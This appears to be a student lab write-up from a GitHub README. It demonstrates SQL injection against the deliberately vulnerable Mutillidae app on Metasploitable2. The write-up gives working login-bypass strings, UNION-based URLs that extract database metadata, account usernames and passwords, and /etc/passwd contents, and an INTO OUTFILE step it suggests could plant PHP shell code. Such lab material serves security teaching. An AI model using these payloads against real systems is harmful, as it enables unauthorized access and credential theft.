# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2
## OUTPUT:
![8 1](https://github.com/user-attachments/assets/caa68578-e783-4c9d-92d4-563f6af04282)



Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
## OUTPUT:
![8 2](https://github.com/user-attachments/assets/81db267b-f6cc-49a2-86b4-6a82310aef72)



Select Multidae from the menu listed as shown above. You will get the page as displayed below:
## OUTPUT:
![8 3](https://github.com/user-attachments/assets/71a1b135-9b80-4188-a962-585788fa3d98)



Click on the menu Login/Register and register for an account
## OUTPUT:
![8 4](https://github.com/user-attachments/assets/74bd0737-0c23-46e5-9e26-6827b31011e2)



Click on the link “Please register here”
## OUTPUT:
![8 5](https://github.com/user-attachments/assets/821dcb35-eae2-41e6-a8e4-c98057b5e6e8)



Click on “Create Account” to display the following page:
## OUTPUT:




The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page. Click “Login”. 
## OUTPUT:
![{BEC6843A-A0F1-4B48-A1FC-98E701497780}](https://github.com/user-attachments/assets/17f2ddcb-829b-4fb0-a8c0-a2532e8e2d2c)

## Bypassing login field

The username field is vulnerable. Put (blaise’ #) or (blaise’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “blaise.”
Now after logging out you will see the login page. In the login page give blaise’ # . You can see the page now enters into the administrator page as before when giving the password.
## OUTPUT:
![{6AA84ECE-7C9E-437D-81A6-E705C16AA32C}](https://github.com/user-attachments/assets/c4f4e507-4837-4abc-b8a7-cea456892295)

Click the login button and you will see it enter into the administrator page
## OUTPUT:
![{6BAF27E0-20AD-4BD9-8334-8928D5B679CF}](https://github.com/user-attachments/assets/4a82518d-4a68-4ec1-98cf-e68918ab3b7a)

## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
## OUTPUT:
![image](https://github.com/user-attachments/assets/79455fec-9807-4697-b09d-c8456a6029d2)
![{BE940EBA-1AA7-4D6C-AAAD-3CF44F45D913}](https://github.com/user-attachments/assets/26ee1e6c-137c-4891-894c-cf855b31c909)
![{FBC7825B-A443-4F3A-BE51-4D8F3534C821}](https://github.com/user-attachments/assets/14a7f703-9a5a-4214-a395-30a2eded90ac)
![{17620DEA-A248-47FD-AEBE-7DB5371619B6}](https://github.com/user-attachments/assets/673450b4-ec03-4ee0-9164-dc8e73cded34)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

## OUTPUT:
![{FC947438-D95C-45CC-AE62-578AD4AEAB34}](https://github.com/user-attachments/assets/90acb007-78d3-45e7-8b07-843559057c57)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27%order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT:
![{FDFABE50-4356-4797-A50D-4CBBB9ABEBD5}](https://github.com/user-attachments/assets/29c13521-0b08-4483-a5d3-71fa42d50882)

After adding the order by 6 into the existing url , the following error statement will be obtained:
## OUTPUT:
![{DF9B2233-A9CC-4D76-B2F6-CB6D9A16775F}](https://github.com/user-attachments/assets/13a4423b-cf55-437b-b182-1f6d67df546c)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
## OUTPUT:
![{E61DA081-43A6-4E32-BD97-95802B14E66B}](https://github.com/user-attachments/assets/d37ef66c-256e-4a92-976f-8b319c09f19e)

 As it is having 5 columns the query worked fine and it provides the correct result
## OUTPUT:
![{5F441A13-6A10-4749-8CBA-4F8B2D54B171}](https://github.com/user-attachments/assets/1afd28d7-ba53-46a0-8f5d-fcb92345ea64)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
## OUTPUT:
![{4BD227B0-A78B-4BEF-A555-40441E85C2B9}](https://github.com/user-attachments/assets/fe9dcc4c-da27-400f-8694-e4386451039d)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
## OUTPUT:
![{AB6E05B4-B7B1-4981-9FC6-90692201F982}](https://github.com/user-attachments/assets/6022edba-cb8d-4490-af75-19093652b06c)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
![{0002973A-5AF7-4C32-B994-A81624440FB8}](https://github.com/user-attachments/assets/faee3c63-caff-4cb9-8736-086ac75ee443)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
![{033A74C8-9DD5-4471-97FA-77A47AC2EE56}](https://github.com/user-attachments/assets/85e95ff5-3ce8-41a0-9e16-e68bfaddb18a)
![{AD9A7552-110E-425A-9758-A996C658F3C8}](https://github.com/user-attachments/assets/6632160b-5cb8-4ad9-95bc-cabfd22c6438)


The url once executed will  retrieve table names from the “owasp 10” database.

## Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

The column names of the accounts is displayed below for the following url:
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 

## OUTPUT:
![{CDEA8F71-7DC6-4FDF-833C-B665149EF259}](https://github.com/user-attachments/assets/f2ee55f2-9b73-4ec7-8afb-0897503a31bc)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT:
![{1ED2C8BB-A5CD-43B0-BB96-87E701ECB7C3}](https://github.com/user-attachments/assets/21abf81d-e047-4793-a284-08fa17ecef5e)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT:
![{08DE6856-DD25-4D89-A338-91A57771534B}](https://github.com/user-attachments/assets/44300184-8a22-4802-88f0-f4e07d31d8bf)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
